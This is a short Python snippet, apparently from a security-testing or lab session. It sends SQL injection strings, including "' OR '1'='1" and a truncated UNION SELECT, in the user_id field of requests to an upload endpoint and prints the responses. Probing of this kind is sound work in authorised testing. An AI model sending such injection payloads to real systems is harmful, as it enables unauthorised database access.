# same script, but fuzz the user_id field instead
for uid in ["' OR '1'='1", "x' UNION SELECT ...", "'"]:
    payload = {"image": build("GalaxyS25"), "description":"t", "user_id": uid}
    r = requests.post(f"{BASE}/upload", json=payload)
    print(repr(uid), r.status_code, r.text[:120])